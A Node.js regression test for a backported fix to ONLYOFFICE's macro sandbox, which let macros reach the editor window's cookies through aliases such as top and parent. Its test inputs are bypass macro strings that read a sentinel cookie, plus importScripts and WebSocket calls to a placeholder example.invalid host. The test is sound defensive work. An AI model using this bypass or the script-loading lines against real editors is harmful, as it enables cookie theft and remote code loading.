/*
 * ONLYOFFICE 10.0 security backport - "Fixed macro sandbox bypass with access
 * to cookies" (Desktop Editors / Docs 10.0.0 changelog).
 *
 * sdkjs common/macros.js _safePluginEval runs a document macro inside a
 * closure whose parameters shadow window, self, globalThis, document,
 * AscDesktopEditor, Function, alert and XMLHttpRequest with stubs. It did not
 * shadow the browser's OTHER names for the same window: top, parent, frames
 * (and opener, frameElement). In the desktop the editor is the top frame, so
 * a macro reached window.document.cookie and window.AscDesktopEditor simply
 * through `top.` or `parent.`. Upstream fixed this in its secureEval refactor
 * (sdkjs 035422915e / 9326596de3, v10 only - it also rewires PDF form
 * actions, which in our tree run in the QuickJS sandbox instead), adding
 * top/parent/frames/WebSocket/importScripts to the shadowed names. We add the
 * same names (plus opener and frameElement) to our _safePluginEval.
 *
 * This extracts the REAL _safePluginEval by brace matching and runs it under
 * node with a fake browser global (top/parent/frames/... all pointing at the
 * global object, which carries a sentinel "cookie").
 *
 * Claimed: a macro naming top/parent/frames/opener/frameElement no longer
 * gets the editor's window; WebSocket/importScripts are stubs; ordinary Api
 * macro code still runs. NOT claimed: that _safePluginEval is a sandbox (see
 * issue-1664-macro-hardening-test.js - Api objects and deferred callbacks
 * still lead back to window; running a macro means trusting it). Not run in
 * the real editor/GUI here.
 *
 * RD_REPO=<sdkjs checkout> (default ../sdkjs). BASELINE=1 reads common/macros.js
 * with `git show $BASE_REF:` and must FAIL.
 */
'use strict';
const { execFileSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const assert = require('assert');

const SDKJS = process.env.RD_REPO || path.resolve(__dirname, '..', 'sdkjs');
// Pinned to the parent of the commit that landed the fix, never HEAD.
const BASE_REF = process.env.BASE_REF || 'b0b55a5bdb^';

function read(rel) {
	return process.env.BASELINE
		? execFileSync('git', ['-C', SDKJS, 'show', `${BASE_REF}:${rel}`], { encoding: 'utf8', maxBuffer: 1 << 28 })
		: fs.readFileSync(path.join(SDKJS, rel), 'utf8');
}
function matched(text, from) {
	const open = text.indexOf('{', from);
	let depth = 0;
	for (let i = open; i < text.length; i++) {
		if (text[i] === '{') depth++;
		else if (text[i] === '}' && --depth === 0) return text.slice(from, i + 1);
	}
	throw new Error('unbalanced braces');
}

let failures = 0;
function check(name, fn) {
	try { fn(); console.log('ok   ' + name); }
	catch (e) { failures++; console.log('FAIL ' + name + ': ' + e.message); }
}

const src = read('common/macros.js');
const at = src.indexOf('function _safePluginEval(');
assert.notStrictEqual(at, -1, '_safePluginEval not found - the extractor needs updating');
const evalSrc = matched(src, at);
assert.ok(evalSrc.includes('"globalThis"'), 'extracted block is not the macro evaluator');

/* a browser-like global: every alias of the window is the global object */
globalThis.window = globalThis;
for (const k of ['top', 'parent', 'frames', 'opener', 'frameElement'])
	globalThis[k] = globalThis;
globalThis.__cookie = 'session=SECRET';
globalThis.importScripts = function () { globalThis.__imported = 1; };
globalThis.WebSocket = function () { globalThis.__socket = 1; };
globalThis.AscCommon = { c_oEditorId: { Word: 0, Spreadsheet: 1, Presentation: 2 }, parseJSDoc: () => [] };
globalThis.customXMLHttpRequest = function () {};
const doc = { paras: ['first', 'second'] };
const jsApi = {
	GetDocument() { return { GetElementsCount: () => doc.paras.length, GetElement: i => ({ GetText: () => doc.paras[i] }) }; },
};
globalThis.g_asc_plugins = { api: { editorId: 0, getJsApi: () => jsApi } };
const safeEval = (0, eval)('"use strict";(' + evalSrc + ')');

check('control: window/self/globalThis/document are already shadowed', () => {
	assert.strictEqual(safeEval('[window, self, globalThis].map(w => w && w.__cookie).filter(Boolean).length'), 0);
});
for (const alias of ['top', 'parent', 'frames', 'opener', 'frameElement']) {
	check(`macro cannot reach the editor window through "${alias}"`, () => {
		const got = safeEval(`(typeof ${alias} === 'object' && ${alias}) ? ${alias}.__cookie : undefined`);
		assert.strictEqual(got, undefined, `${alias}.__cookie returned ${JSON.stringify(got)}`);
	});
}
check('WebSocket and importScripts are stubs inside a macro', () => {
	delete globalThis.__imported; delete globalThis.__socket;
	safeEval('importScripts("https://example.invalid/x.js"); new WebSocket("wss://example.invalid/")');
	assert.ok(!globalThis.__imported, 'importScripts reached the real one');
	assert.ok(!globalThis.__socket, 'WebSocket reached the real one');
});
check('ordinary macro code still runs', () => {
	const r = safeEval('var d = Api.GetDocument(), t = []; for (var i = 0; i < d.GetElementsCount(); i++) t.push(d.GetElement(i).GetText()); t.join("+")');
	assert.strictEqual(r, 'first+second');
});

console.log(failures ? `${failures} check(s) FAILED` : 'all checks passed');
process.exit(failures ? 1 : 0);
